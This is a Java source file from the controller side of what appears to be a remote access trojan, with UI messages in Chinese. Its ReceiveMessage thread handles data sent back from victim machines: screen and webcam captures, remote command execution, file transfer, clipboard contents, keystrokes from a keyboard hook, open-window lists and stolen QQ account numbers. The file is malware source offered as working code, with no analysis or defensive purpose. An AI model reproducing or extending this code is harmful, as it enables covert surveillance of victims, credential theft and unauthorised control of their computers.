package me.server.utils;

import me.server.receive.*;

import javax.swing.*;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.Socket;

public class ReceiveMessage extends Thread{
    String IP;
    Socket socket;
    File file;
    DataInputStream dataInputStream;
    GetScreen getScreen;
    GetTaskList getTaskList;
    GetSystemInfo systemInfo;
    GetCamera getCamera;
    RemoteChat remoteChat;
    RemoteCmd remoteCmd;
    FileManage fileManage;
    GetQQNumber getQQNumber;
    ClipBorad clipBorad;
    KeyBoardHook hook;
    EnumWindows windows;
    FileOutputStream fileOutputStream;
    public ReceiveMessage(Socket socket,String IP) throws Exception{
        this.dataInputStream = new DataInputStream(socket.getInputStream());
        this.socket = socket;
        this.IP = IP;
    }
    JLabel label;
    @Override
    public void run() {
        try {
            while (true) {
                Thread.sleep(1);
                    byte[] head = SendMessage.receiveHead(dataInputStream);
                    int len;
                    byte[] context;
                    switch (head[0]) {
                        case MessageFlags.HEARTPACK:
                            //心跳包
                            break;
                        case MessageFlags.SHOW_SCREEN:
                            getScreen = new GetScreen(socket,IP);
                            break;
                        case MessageFlags.UPDATE_SCREEN:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getScreen.update(context);
                            break;
                        case MessageFlags.SHOW_TASKLIST:
                            getTaskList = new GetTaskList(socket,IP);
                            break;
                        case MessageFlags.UPDATE_TASKLIST:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getTaskList.update(context);
                            break;
                        case MessageFlags.SHOW_SYSTEMINFO:
                            systemInfo = new GetSystemInfo(socket,IP);
                            break;
                        case MessageFlags.UPDATE_SYSTEMINFO:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            systemInfo.update(context);
                            break;
                        case MessageFlags.CAMERA_ERROR:
                            JOptionPane.showMessageDialog(null,"未找到摄像头!","错误",JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.SHOW_CAMERA:
                            getCamera = new GetCamera(socket,IP);
                            break;
                        case MessageFlags.UPDATE_CAMERA:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getCamera.update(context);
                            break;
                        case MessageFlags.SHOW_REMOTECHAT:
                            remoteChat = new RemoteChat(socket,IP);
                            break;
                        case MessageFlags.SEND_REMOTECHAT:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            remoteChat.update(context);
                            break;
                        case MessageFlags.SHOW_REMOTE_CMD:
                            remoteCmd = new RemoteCmd(socket,IP);
                            break;
                        case MessageFlags.EXECUTE_REMOTE_CMD:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            remoteCmd.update(context);
                            break;
                        case MessageFlags.SHOW_FILEWINDOW:
                            fileManage = new FileManage(socket,IP);
                            break;
                        case MessageFlags.FILE_QUERY:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            fileManage.update(context);
                            break;
                        case MessageFlags.FILE_DOWNLOAD_OK:
                            JOptionPane.showMessageDialog(null, "文件发送成功", "提示", JOptionPane.INFORMATION_MESSAGE);
                            break;
                        case MessageFlags.FILE_DOWNLOAD_ERROR:
                            JOptionPane.showMessageDialog(null, "文件下载失败..(文件过大)", "提示", JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.FILE_CREATEWITHNAME:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            file = new File(System.getProperty("user.dir") + "\\" + new String(context));
                            file.createNewFile();
                            break;
                            case MessageFlags.FILE_PREPARE:
                                fileOutputStream = new FileOutputStream(file);
                                break;
                        case MessageFlags.FILE_DOWNLOAD:
                            len = SendMessage.receiveLength(dataInputStream);
                            try {
                                context = SendMessage.receiveContext(dataInputStream, len);
                                fileOutputStream.write(context);
                            } catch (Exception e) {
                            }
                            break;
                            case MessageFlags.FILE_DOWNLOAD_END:
                                len = SendMessage.receiveLength(dataInputStream);
                                context = SendMessage.receiveContext(dataInputStream, len);
                                String str = new String(context) + "$下载";
                                FileManage.arrayList.remove(str);
                                fileManage.flashTable();
                                fileOutputStream.close();
                                break;
                        case MessageFlags.FILE_UPLOAD_OK:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            String str1 = new String(context) + "$上传";
                            FileManage.arrayList.remove(str1);
                            fileManage.flashTable();
                            break;
                        case MessageFlags.SHOW_QQNUMBERWINDOW:
                            getQQNumber = new GetQQNumber(socket,IP);
                            break;
                        case MessageFlags.GET_QQNUMBER:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            getQQNumber.update(context);
                            break;
                        case MessageFlags.GET_QQNUMBER_ERROR:
                            JOptionPane.showMessageDialog(null, "获取QQ出错..", "提示", JOptionPane.ERROR_MESSAGE);
                            break;
                        case MessageFlags.SHOW_CLIPBORADWINDOW:
                            clipBorad = new ClipBorad(socket,IP);
                            break;
                        case MessageFlags.GET_CLIPBORAD:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            clipBorad.update(context);
                            break;
                        case MessageFlags.SHOW_KEYBORADWINDOW:
                            hook = new KeyBoardHook(socket,IP);
                            break;
                        case MessageFlags.UPDATE_KEYBORAD:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            hook.update(context);
                            break;
                        case MessageFlags.SHOW_ENUM_WINDOWS:
                            windows = new EnumWindows(socket,IP);
                            break;
                        case MessageFlags.ENUM_WINDOWS:
                            len = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, len);
                            windows.update(context);
                            break;

                }
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}
